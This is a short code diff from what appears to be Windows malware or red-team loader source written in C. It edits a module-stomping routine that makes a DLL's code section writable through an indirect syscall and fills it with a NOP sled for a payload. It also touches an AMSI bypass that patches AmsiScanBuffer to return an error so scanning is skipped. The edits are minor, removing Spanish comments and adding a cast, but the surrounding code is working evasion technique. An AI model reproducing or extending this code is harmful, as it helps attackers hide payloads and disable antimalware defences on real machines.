@@ -86,10 +86,8 @@ static BOOL ModuleStompRobust(LPCWSTR targetDll, SIZE_T payloadSize, PSTOMP_CONT
     ULONG oldProtect = 0;
     SIZE_T regionSize = ctx->RegionSize;
     
-    // Cambiar a RW para escribir payload
     InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pText, &regionSize, PAGE_READWRITE, &oldProtect);
-    memset(pText, 0x90, ctx->RegionSize); // NOP sled para sigilo
-    // El payload se escribe después en ExecutePayload o aquí si lo tuviéramos
+    memset(pText, 0x90, ctx->RegionSize); 
     
     return TRUE;
 }
@@ -117,7 +115,7 @@ static BOOL BypassAMSI_DataOnlyRobust() {
     if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
     if (!hAmsi) return FALSE;
     
-    PVOID pAmsiScanBuffer = GetProcAddress((HMODULE)hAmsi, "AmsiScanBuffer");
+    PVOID pAmsiScanBuffer = (PVOID)GetProcAddress((HMODULE)hAmsi, "AmsiScanBuffer");
     if (pAmsiScanBuffer) {
         BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; 
         ULONG oldProtect = 0;
